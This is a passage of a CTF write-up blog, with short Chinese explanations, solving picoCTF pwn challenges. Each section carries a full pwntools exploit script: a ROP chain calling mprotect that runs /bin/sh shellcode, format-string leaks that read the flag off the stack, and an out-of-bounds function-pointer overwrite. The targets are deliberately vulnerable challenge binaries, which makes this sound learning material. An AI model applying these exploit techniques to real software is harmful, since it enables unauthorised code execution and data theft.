res =  b'You win! Play again?\r\n'
4
res =  b'You win! Play again?\r\n'
5
...
b'picoCTF{50M3_3X7R3M3_1UCK_32F730C2}\r\n'
...
real	9m10.276s
user	0m1.003s
sys	0m0.131s
</code></pre></div></div>

<h2 id="ropfu">ropfu</h2>

<h3 id="思路-8">思路</h3>

<p>No canary，stack有执行权限，用mprotect赋予bss段可执行权限，然后往bss段写入shellcode并执行</p>

<h3 id="exp-7">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">54462</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="c1"># shellcode one
# sc = shellcraft.sh()
# sc = asm(sc)
# print(len(sc))
</span>
<span class="c1"># shellcode two
# sc = "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
# sc += "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
# print(len(sc))
</span>
<span class="c1"># shellcode three
</span><span class="s">'''
execve('/bin/sh', 0, 0)
eax = 11, ebx -&gt; '/bin/sh', ecx = edx = 0
'''</span>
<span class="n">sc</span> <span class="o">=</span> <span class="s">''</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="s">'xor ecx,ecx;'</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="s">'mul ecx;'</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="s">'push ecx;'</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="s">'push 0x68732f2f;'</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="s">'push 0x6e69622f;'</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="s">'mov ebx,esp;'</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="s">'mov al,11;'</span>
<span class="n">sc</span> <span class="o">+=</span> <span class="s">'int 0x80'</span>
<span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>

<span class="n">bss</span> <span class="o">=</span> <span class="mh">0x080E6000</span>
<span class="n">pop_edx_ebx_esi_ret</span> <span class="o">=</span> <span class="mh">0x0805f7b6</span>

<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0x18</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'mprotect'</span><span class="p">])</span> 
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ebx_esi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'read'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="n">sla</span><span class="p">(</span><span class="s">'grasshopper!</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
<span class="n">sl</span><span class="p">(</span><span class="n">sc</span><span class="p">)</span>
<span class="n">sl</span><span class="p">(</span><span class="s">'cat flag.txt'</span><span class="p">)</span>
<span class="n">itr</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="flag-leak">flag leak</h2>

<h3 id="思路-9">思路</h3>

<p>scanf最多可以读入127个字符，利用printf格式化字符串漏洞泄露flag</p>

<h3 id="exp-8">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">64125</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'%45$x---'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'%44$x---'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'%43$x---'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'%42$x---'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'%41$x---'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'%40$x---'</span><span class="o">+</span> <span class="sa">b</span><span class="s">'%39$x---'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'%38$x---'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'%37$x---'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'%36$x---'</span><span class="o">+</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x30</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'0'</span><span class="o">*</span><span class="mi">3</span>
<span class="n">sla</span><span class="p">(</span><span class="s">'you one &gt;&gt; '</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>

<span class="c1"># get flag, little endian
# 7b465443---6f636970---5f676e31---6b34334c---6666305f
# ---67346c46---655f6b63---3474535f---7d326136---34623962
</span>
<span class="n">str_li</span> <span class="o">=</span> <span class="p">[</span><span class="s">'7d326136'</span><span class="p">,</span> <span class="s">'34623962'</span><span class="p">,</span> <span class="s">'655f6b63'</span><span class="p">,</span><span class="s">'3474535f'</span><span class="p">,</span><span class="s">'6666305f'</span>
          <span class="p">,</span><span class="s">'67346c46'</span><span class="p">,</span><span class="s">'5f676e31'</span><span class="p">,</span><span class="s">'6b34334c'</span><span class="p">,</span><span class="s">'7b465443'</span><span class="p">,</span><span class="s">'6f636970'</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mh">0x7d</span><span class="p">))</span>

<span class="n">ch_l</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">str_li</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">v</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
                <span class="n">ch</span> <span class="o">=</span> <span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
                <span class="n">ch_l</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ch</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
                <span class="k">print</span><span class="p">(</span><span class="n">ch_l</span><span class="p">)</span>

<span class="n">ch_l</span> <span class="o">=</span> <span class="n">ch_l</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="n">ch_l</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="result-2">Result</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
b'7d326136---34623962---655f6b63---3474535f---6666305f
---67346c46---5f676e31---6b34334c---7b465443---6f636970
---aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n'
...
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{F
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FT
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FTC
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FTCo
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FTCoc
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FTCoci
}2a64b9be_kc4tS_ff0_g4lF_gn1k43L{FTCocip
picoCTF{L34k1ng_Fl4g_0ff_St4ck_eb9b46a2}
</code></pre></div></div>

<h2 id="function-overwrite">function overwrite</h2>

<h3 id="思路-10">思路</h3>

<p>通过fun数组越界，覆盖check指针为easy_checker函数的地址，在拼凑数据使得能通过calculate_story_score函数的检查，既可收到flag。</p>

<h3 id="exp-9">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">52369</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">payload</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="mi">97</span><span class="p">)</span><span class="o">*</span><span class="mi">11</span> <span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">sla</span><span class="p">(</span><span class="s">"if you're a 1337 &gt;&gt; "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">ru</span><span class="p">(</span><span class="s">"Keep the first one less than 10.</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="o">-</span><span class="mi">16</span><span class="p">))</span>
<span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="o">-</span><span class="mi">314</span><span class="p">))</span>

<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">rl</span><span class="p">())</span>
</code></pre></div></div>

<h2 id="stack-cache">stack cache</h2>

<h3 id="思路-11">思路</h3>

<p>函数读取的数据，在函数退栈后，仍然会遗留在栈上。因此，函数退栈后，可以利用格式化字符泄漏这些栈上的关键数据</p>

<h3 id="exp-10">EXP</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span><span class="s">'splitw'</span><span class="p">,</span><span class="s">'-h'</span><span class="p">]</span>

<span class="n">binary</span> <span class="o">=</span> <span class="s">'./vuln'</span>
<span class="k">if</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'r'</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'saturn.picoctf.net'</span><span class="p">,</span> <span class="mi">51157</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x0804900e</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="p">(</span><span class="mh">0xa</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'cccc'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049DA0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049E20</span><span class="p">)</span>
<span class="n">sla</span><span class="p">(</span><span class="s">'gets you the flag</span><span class="se">\n</span><span class="s">'</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">rls</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>

<span class="c1"># b'User information : 0x80c9a04 0x804007d 0x61333337 0x31646239 0x5f597230 0x6d334d5f', 
# b'Names of user: 0x50755f4e 0x34656c43 0x7b465443', 
# b'Age of user: 0x6f636970'
</span>
<span class="c1"># little endian
</span><span class="n">str_li</span> <span class="o">=</span> <span class="p">[</span><span class="s">'7d'</span><span class="p">,</span> <span class="s">'61333337'</span><span class="p">,</span><span class="s">'31646239'</span><span class="p">,</span><span class="s">'5f597230'</span><span class="p">,</span><span class="s">'6d334d5f'</span><span class="p">,</span><span class="s">'50755f4e'</span><span class="p">,</span><span class="s">'34656c43'</span><span class="p">,</span><span class="s">'7b465443'</span><span class="p">,</span><span class="s">'6f636970'</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="mh">0x7d</span><span class="p">))</span>

<span class="n">ch_l</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">str_li</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">v</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
                <span class="n">ch</span> <span class="o">=</span> <span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">v</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
                <span class="n">ch_l</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ch</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
                <span class="k">print</span><span class="p">(</span><span class="n">ch_l</span><span class="p">)</span>

<span class="n">ch_l</span> <span class="o">=</span> <span class="n">ch_l</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="k">print</span><span class="p">(</span><span class="n">ch_l</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="result-3">Result</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
b'User information : 0x80c9a04 0x804007d 0x61333337 0x31646239 0x5f597230 0x6d334d5f\n'
b'Names of user: 0x50755f4e 0x34656c43 0x7b465443\n'
b'Age of user: 0x6f636970\n'
...
